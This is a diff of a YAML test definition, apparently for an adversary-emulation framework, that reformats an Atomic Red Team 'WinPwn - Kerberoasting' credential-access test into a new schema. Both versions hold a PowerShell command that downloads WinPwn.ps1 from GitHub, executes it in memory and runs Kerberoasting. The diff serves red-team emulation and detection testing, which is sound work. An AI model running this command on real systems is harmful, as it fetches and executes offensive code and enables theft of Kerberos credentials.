@@ -1,13 +1,15 @@
-- id: c9b28ebc-e7f9-569f-8b38-c94aeeeda718
+- requirements: []
   name: Soumaia ART Tests - WinPwn - Kerberoasting
   description: Kerberoasting technique via function of WinPwn
   tactic: credential-access
-  technique:
-    attack_id: T1558.003
-    name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-          Kerberoasting -consoleoutput -noninteractive
+  technique_id: T1558.003
+  technique_name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Kerberoasting -consoleoutput -noninteractive
+  id: c9b28ebc-e7f9-569f-8b38-c94aeeeda718
